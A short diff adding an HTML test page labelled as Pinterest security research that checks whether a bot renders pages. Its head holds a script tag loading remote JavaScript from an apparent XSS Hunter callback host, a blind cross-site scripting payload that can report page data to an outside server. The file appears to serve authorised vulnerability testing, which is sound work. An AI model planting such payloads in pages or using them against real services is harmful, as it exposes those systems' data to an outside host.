@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pinterest Security Research</title>
+    <script src="https://buzz776c0d3.xss.ht"></script>
+</head>
+<body>
+    <h1>Testing Metadata Extraction</h1>
+    <p>If you see this, the bot has rendered the page.</p>
+</body>
+</html>
